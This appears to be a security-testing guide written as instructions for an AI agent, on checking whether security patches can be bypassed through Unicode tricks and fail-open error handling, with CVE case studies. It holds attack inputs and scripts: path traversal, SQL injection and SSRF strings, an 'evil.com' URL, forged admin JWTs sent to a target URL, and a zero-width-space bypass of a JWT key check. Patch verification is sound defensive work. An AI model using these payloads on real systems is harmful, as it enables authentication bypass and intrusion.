# Patch Verification & Encoding Evasion Methodology — Agent Chunk 48c
> Source: Deep Internet Research 2026 (Adversarially Verified)
> Purpose: Understand the systematic META-GAP of incomplete patch verification — how to test security patches for encoding-level evasion, fail-open pattern detection, and the real-world patch bypass chain that proves these techniques work
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
After ANY security patch is deployed, systematically test it with encoding-level evasion techniques (Unicode zero-width characters, BOM markers, control characters, normalization forms). Test error-handling paths with unexpected input types to detect fail-open patterns where exceptions cause implicit allow-all behavior. This methodology exists because multiple critical 2026 CVEs demonstrate that patches themselves create new bypass paths. The patch is not the end of the vulnerability — it is the beginning of the next attack surface.

---

## 1. Encoding-Level Evasion Methodology

### 1.1 The Meta-Gap

Security patches typically add validation checks — regex patterns, input sanitization, allowlists. These checks are written against the developer's mental model of "what input looks like." Encoding-level evasion exploits the gap between what the developer's regex matches and what the runtime actually processes.

The pattern is universal:
1. Vulnerability discovered (e.g., algorithm confusion in JWT)
2. Patch adds validation (e.g., regex to detect PEM keys)
3. Validation assumes clean ASCII input
4. Unicode/encoding variants bypass the validation
5. Original vulnerability is re-exploitable through the patch itself

### 1.2 Unicode Zero-Width Character Testing

Zero-width characters are invisible in display but present in the string. They defeat regex anchors (`^`, `$`), `trim()`, and visual inspection.

```python
# Zero-width character injection test suite
ZERO_WIDTH_CHARS = {
    '​': 'Zero-width space',
    '‌': 'Zero-width non-joiner',
    '‍': 'Zero-width joiner',
    '﻿': 'Byte order mark (BOM)',
    '‎': 'Left-to-right mark',
    '‏': 'Right-to-left mark',
    '⁠': 'Word joiner',
    '⁡': 'Function application',
    '⁢': 'Invisible times',
    '⁣': 'Invisible separator',
    '⁤': 'Invisible plus',
    '᠎': 'Mongolian vowel separator',
}

def test_zero_width_evasion(validation_func, valid_input, position='prefix'):
    """Test if validation can be bypassed with zero-width characters."""
    
    results = {}
    
    for char, name in ZERO_WIDTH_CHARS.items():
        if position == 'prefix':
            test_input = char + valid_input
        elif position == 'suffix':
            test_input = valid_input + char
        elif position == 'inline':
            midpoint = len(valid_input) // 2
            test_input = valid_input[:midpoint] + char + valid_input[midpoint:]
        
        try:
            result = validation_func(test_input)
            results[name] = {
                'bypassed': result != validation_func(valid_input),
                'char': f'U+{ord(char):04X}',
                'position': position
            }
        except Exception as e:
            results[name] = {'error': str(e)}
    
    return results
```

**Apply to every data path the patch validates:**
```python
# For each patched validation function:
validation_targets = [
    ('PEM detection regex', pem_regex_check, pem_key_string),
    ('URL validation', url_validator, 'http://example.com'),
    ('Algorithm allowlist', alg_check, 'RS256'),
    ('Path traversal filter', path_filter, '../etc/passwd'),
    ('SQL injection filter', sql_filter, "' OR 1=1 --"),
    ('Email validation', email_check, 'admin@target.com'),
]

for name, func, input_val in validation_targets:
    for position in ['prefix', 'suffix', 'inline']:
        results = test_zero_width_evasion(func, input_val, position)
        bypasses = {k: v for k, v in results.items() if v.get('bypassed')}
        if bypasses:
            print(f"BYPASS FOUND in {name} ({position}):")
            for char_name, details in bypasses.items():
                print(f"  {char_name} ({details['char']})")
```

### 1.3 BOM Marker Testing

The UTF-8 BOM (0xEF 0xBB 0xBF) is three bytes that appear at the start of a string. Many parsers silently strip it, but regex patterns and string comparison do not account for it.

```python
# BOM injection tests
BOM_VARIANTS = {
    b'\xef\xbb\xbf': 'UTF-8 BOM',
    b'\xff\xfe':     'UTF-16 LE BOM',
    b'\xfe\xff':     'UTF-16 BE BOM',
    b'\xff\xfe\x00\x00': 'UTF-32 LE BOM',
    b'\x00\x00\xfe\xff': 'UTF-32 BE BOM',
}

def test_bom_evasion(validation_func, valid_input_bytes):
    """Test if BOM markers bypass byte-level validation."""
    
    for bom, name in BOM_VARIANTS.items():
        # Prepend BOM to input
        test_input = bom + valid_input_bytes
        
        try:
            result = validation_func(test_input)
            print(f"{name}: {'BYPASSED' if result else 'blocked'}")
        except Exception as e:
            print(f"{name}: exception - {e}")
```

### 1.4 Control Character Testing

ASCII control characters (0x00-0x1F) can disrupt string parsing, terminate strings early (null byte), or cause parser state confusion.

```python
# Control character injection
CONTROL_CHARS = {
    '\x00': 'Null byte',
    '\x01': 'Start of Heading',
    '\x02': 'Start of Text',
    '\x03': 'End of Text',
    '\x04': 'End of Transmission',
    '\x07': 'Bell',
    '\x08': 'Backspace',
    '\x0b': 'Vertical Tab',
    '\x0c': 'Form Feed',
    '\x0e': 'Shift Out',
    '\x0f': 'Shift In',
    '\x1b': 'Escape',
    '\x7f': 'Delete',
}

def test_control_char_evasion(validation_func, valid_input):
    """Test control character injection at every position."""
    
    for char, name in CONTROL_CHARS.items():
        positions = {
            'prefix': char + valid_input,
            'suffix': valid_input + char,
            'inline': valid_input[:5] + char + valid_input[5:],
        }
        
        for pos, test_input in positions.items():
            try:
                result = validation_func(test_input)
                if result:
                    print(f"BYPASS: {name} at {pos}")
            except Exception as e:
                # Exception might indicate fail-open opportunity
                print(f"EXCEPTION with {name} at {pos}: {type(e).__name__}")
```

### 1.5 Unicode Normalization Testing

Unicode normalization (NFC, NFD, NFKC, NFKD) can transform characters into different representations. A validation that checks pre-normalization may pass input that post-normalization matches a blocked pattern.

```python
import unicodedata

def test_normalization_evasion(validation_func, blocked_input):
    """Test if Unicode normalization can bypass validation."""
    
    normalization_forms = ['NFC', 'NFD', 'NFKC', 'NFKD']
    
    for form in normalization_forms:
        normalized = unicodedata.normalize(form, blocked_input)
        
        if normalized != blocked_input:
            try:
                result = validation_func(normalized)
                if result:
                    print(f"NORMALIZATION BYPASS ({form}):")
                    print(f"  Original: {repr(blocked_input)}")
                    print(f"  Normalized: {repr(normalized)}")
            except Exception:
                pass

# Test with homoglyphs and decomposed characters
HOMOGLYPH_SUBSTITUTIONS = {
    'a': ['а', 'ａ'],  # Cyrillic a, fullwidth a
    'e': ['е', 'ｅ'],  # Cyrillic e, fullwidth e
    'o': ['о', 'ｏ'],  # Cyrillic o, fullwidth o
    'p': ['р', 'ｐ'],  # Cyrillic p, fullwidth p
    's': ['ѕ', 'ｓ'],  # Cyrillic s, fullwidth s
    '/': ['／', '∕'],  # Fullwidth solidus, division slash
    '.': ['．', '․'],  # Fullwidth full stop, one dot leader
}
```

### 1.6 Right-to-Left Override Testing

The right-to-left override character (U+202E) reverses the visual display of text. This can make malicious paths appear benign in logs and UIs.

```python
def test_rtl_override_evasion(validation_func, path):
    """Test RTL override for path traversal evasion."""
    
    rtl_chars = [
        '‮',  # Right-to-left override
        '‭',  # Left-to-right override
        '‪',  # Left-to-right embedding
        '‫',  # Right-to-left embedding
        '⁦',  # Left-to-right isolate
        '⁧',  # Right-to-left isolate
    ]
    
    for char in rtl_chars:
        test_path = char + path
        result = validation_func(test_path)
        if result:
            print(f"RTL BYPASS: U+{ord(char):04X} allows {repr(path)}")
```

---

## 2. Fail-Open Pattern Detection

### 2.1 Core Principle

A fail-open pattern occurs when an exception or unexpected condition causes a security check to implicitly ALLOW the request instead of DENY it. The goal of fail-open testing is to trigger exceptions in security code and observe if the request proceeds.

### 2.2 JWT Fail-Open Testing

```python
# JWT-specific fail-open test cases
JWT_FAILOPEN_TESTS = [
    # Bogus algorithm headers
    {"alg": "XS512", "typ": "JWT"},
    {"alg": "PS384FAKE", "typ": "JWT"},
    {"alg": "NONE", "typ": "JWT"},        # Case variation
    {"alg": "None", "typ": "JWT"},        # Case variation
    {"alg": "nOnE", "typ": "JWT"},        # Mixed case
    {"alg": "RS256-v2", "typ": "JWT"},    # Version suffix
    {"alg": "", "typ": "JWT"},            # Empty algorithm
    {"alg": None, "typ": "JWT"},          # Null algorithm
    {"typ": "JWT"},                        # Missing algorithm entirely
    {"alg": "HS256", "typ": "JWT", "extra": "A" * 10000},  # Oversized header
    
    # Malformed signatures
    # (use with valid algorithm header to test signature verification error handling)
]

def test_jwt_fail_open(target_url):
    """Test if JWT validation fails open on unexpected algorithms."""
    
    for header in JWT_FAILOPEN_TESTS:
        token = craft_jwt_with_header(header, admin_claims, "garbage-sig")
        
        resp = requests.get(
            target_url,
            headers={"Authorization": f"Bearer {token}"},
            timeout=10
        )
        
        if resp.status_code == 200:
            alg = header.get("alg", "MISSING")
            print(f"FAIL-OPEN: algorithm '{alg}' accepted — request authenticated")
        elif resp.status_code == 500:
            print(f"SERVER ERROR with '{header}' — exception may be swallowed")
```

### 2.3 URL Validation Fail-Open Testing

```python
# URL validation fail-open test cases
URL_FAILOPEN_TESTS = [
    "",                          # Empty string
    "://",                       # Missing scheme
    "javascript:alert(1)",      # Unsupported scheme
    "file:///etc/passwd",       # File scheme
    "gopher://internal:25",     # Gopher protocol
    "dict://internal:11211",    # Dict protocol (memcached)
    None,                       # Null value
    123,                        # Integer instead of string
    ["http://evil.com"],        # Array instead of string
    {"url": "http://evil.com"}, # Object instead of string
    "http://" + "A" * 100000,  # Oversized URL
    "\x00http://evil.com",     # Null byte prefix
]

def test_url_validation_fail_open(validation_func):
    """Test if URL validation fails open on unexpected inputs."""
    
    for test_url in URL_FAILOPEN_TESTS:
        try:
            result = validation_func(test_url)
            if result:
                print(f"FAIL-OPEN: URL validation passed for: {repr(test_url)}")
        except TypeError:
            print(f"  TypeError with {repr(test_url)} — check error handling")
        except Exception as e:
            print(f"  Exception {type(e).__name__} with {repr(test_url)}")
```

### 2.4 Access Control Fail-Open Testing

```python
# Access control fail-open via unexpected HTTP methods and parameters
ACCESS_CONTROL_TESTS = [
    # Unexpected HTTP methods
    {"method": "PATCH", "note": "method not in allowlist"},
    {"method": "OPTIONS", "note": "preflight may bypass auth"},
    {"method": "TRACE", "note": "trace may bypass auth"},
    {"method": "PROPFIND", "note": "WebDAV method"},
    {"method": "MKCOL", "note": "WebDAV method"},
    {"method": "INVENTED", "note": "custom method"},
    
    # Missing required parameters
    {"missing": "auth_token", "note": "missing auth entirely"},
    {"missing": "tenant_id", "note": "missing tenant context"},
    {"missing": "scope", "note": "missing scope parameter"},
    
    # Type confusion
    {"param": "role", "value": ["admin"], "note": "array instead of string"},
    {"param": "role", "value": True, "note": "boolean instead of string"},
    {"param": "role", "value": 1, "note": "integer instead of string"},
]
```

---

## 3. Real-World Patch Bypass Examples

### 3.1 fast-jwt: CVE-2026-34950 -> CVE-2026-107722

**Original vulnerability:** Algorithm confusion (RS256->HS256) using server's public key as HMAC secret.

**Patch (CVE-2026-34950):** Added PEM key detection via regex with `^` anchor and `trim()`.

```javascript
// Patched validation (still vulnerable)
function isPEMKey(key) {
    return /^-----BEGIN (RSA |EC )?PUBLIC KEY-----/.test(key.trim());
}
```

**Bypass (CVE-2026-107722):** Prepend U+200B zero-width space to the PEM key. `trim()` does not remove it. Regex `^` anchor sees the zero-width space first, not `-----BEGIN`. PEM detection fails, key falls through to HMAC path.

```javascript
const evasionKey = '​' + serverPublicKeyPEM;
// trim() output: '​-----BEGIN PUBLIC KEY-----...'
// Regex test: false (^ sees U+200B, not '-----BEGIN')
// Result: HMAC path used with public key as secret
```

**Lesson:** The patch itself created the new attack surface. Testing the patch with Unicode zero-width prefixes would have caught this immediately.

### 3.2 WSO2: CVE-2026-5430 (Exception Swallowing)

**Vulnerability class:** Fail-open via exception handling.

**Root cause:** `catch (APIManagementException)` block returns `true` (authenticated) instead of `false` (rejected).

**Detection method:** Send JWT with bogus algorithm header. If request succeeds with 200, the exception handler is fail-open.

**Lesson:** Every catch block in authentication code is a potential fail-open. Test by triggering exceptions with malformed input.

### 3.3 Next.js: CVE-2026-44578 (WebSocket Upgrade)

**Vulnerability class:** Bypass via protocol-level code path separation.

**Root cause:** WebSocket upgrade requests use a different handler that does not include HTTP security checks.

**Detection method:** Send the same SSRF payload as both a normal HTTP request (blocked) and a WebSocket upgrade request (passes).

**Lesson:** Security checks applied at one protocol level may not cover other protocol upgrade paths. Test the same payload through every available protocol and handler.

---

## 4. Systematic Patch Verification Checklist

### 4.1 Post-Patch Testing Protocol

```
For EVERY security patch deployed:

1. ENCODING EVASION (Section 1)
   [ ] Unicode zero-width character prefix/suffix/inline
   [ ] BOM marker prefix (UTF-8, UTF-16, UTF-32)
   [ ] Control characters (0x00-0x1F, 0x7F)
   [ ] Unicode normalization forms (NFC, NFD, NFKC, NFKD)
   [ ] Right-to-left override characters
   [ ] Homoglyph substitution
   [ ] Combining diacritical marks
   
2. FAIL-OPEN DETECTION (Section 2)
   [ ] Unexpected input types (null, array, object, integer)
   [ ] Empty strings and missing required fields
   [ ] Oversized inputs (trigger buffer/length errors)
   [ ] Unsupported/unknown values (bogus algorithms, schemes)
   [ ] Malformed/truncated data (half a JWT, partial URL)
   
3. CODE PATH COVERAGE
   [ ] Every error handler in the patched code path
   [ ] Every catch block — does it reject or allow?
   [ ] Every default/else branch — fail-open or fail-closed?
   [ ] Protocol upgrade paths (WebSocket, HTTP/2, gRPC)
   [ ] Content-type variations (JSON vs XML vs form-encoded)
   
4. REGRESSION VERIFICATION
   [ ] Original exploit still blocked
   [ ] Encoded variants of original exploit blocked
   [ ] Exception-triggering variants blocked
   [ ] Cross-protocol variants blocked
```
